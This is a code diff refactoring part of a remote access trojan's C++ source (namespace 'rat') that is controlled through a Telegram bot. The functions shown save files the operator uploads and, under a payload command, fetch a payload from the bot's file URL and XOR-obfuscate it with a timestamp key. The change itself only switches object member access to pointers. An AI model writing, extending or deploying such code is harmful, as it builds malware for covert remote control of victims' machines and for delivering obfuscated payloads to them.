@@ -26,7 +26,7 @@ void Handler::handleMessageWithUploadedFiles() {
             file_path /= rat::system::getCurrentDateTime_Underscored();
         }
         DEBUG_LOG("We have file {} trying to download it", file_path.string());
-        if(bot.downloadFile(file.id, file_path)) {
+        if(this->bot->downloadFile(file.id, file_path)) {
             response_buffer << "File: " << file_path.string() << " has been downloaded\n";
         } else {
             response_buffer << "File: " << file_path.string() << " has not been downloaded\n";
@@ -34,14 +34,14 @@ void Handler::handleMessageWithUploadedFiles() {
     }
 
     response_buffer << fmt::format("Received {} uploaded file(s)", telegram_update.message.files.size());
-    bot.sendMessage(response_buffer.str());
+    this->bot->sendMessage(response_buffer.str());
 }
 
 void Handler::handlePayloadCommand() {
-    this->bot.sendMessage("Integrating the payload...");
+    this->bot->sendMessage("Integrating the payload...");
 
     if (this->telegram_update.message.files.empty()) {
-        this->bot.sendMessage("No file found in the update.");
+        this->bot->sendMessage("No file found in the update.");
         return;
     }
 
@@ -58,29 +58,28 @@ void Handler::handlePayloadCommand() {
     }
 
     // Store key for obfuscation
-    this->state.payload_key = time_stamp;
+    this->state->payload_key = time_stamp;
 
     // Construct file URL (adjust depending on your bot API)
-    const std::string file_url = fmt::format("{}{}", this->bot.getBotFileUrl(), file_id);
-    this->backing_bot.curl_client.hardResetHandle();
-    this->bot.sendMessage("Downloading the Payload...");
-    if (!this->backing_bot.curl_client.downloadData(file_url, this->state.payload)) {
-        this->bot.sendMessage("Failed to download payload.");
+    const std::string file_url = fmt::format("{}{}", this->bot->getBotFileUrl(), file_id);
+    this->bot->sendMessage("Downloading the Payload...");
+    if (!this->bot->curl_client.downloadData(file_url, this->state->payload)) {
+        this->bot->sendMessage("Failed to download payload.");
         return;
     }
 
-    if (!this->state.payload.empty()) {
-        this->bot.sendMessage("Obfuscating it...");
+    if (!this->state->payload.empty()) {
+        this->bot->sendMessage("Obfuscating it...");
         rat::encryption::xorData(
-            this->state.payload.data(),
-            this->state.payload.size(),
-            this->state.payload_key.c_str()
+            this->state->payload.data(),
+            this->state->payload.size(),
+            this->state->payload_key.c_str()
         );
     } else {
-        this->bot.sendMessage("Payload is empty after download.");
+        this->bot->sendMessage("Payload is empty after download.");
         return;
     }
 
-    this->bot.sendMessage("Integration complete.");
+    this->bot->sendMessage("Integration complete.");
 }
 }
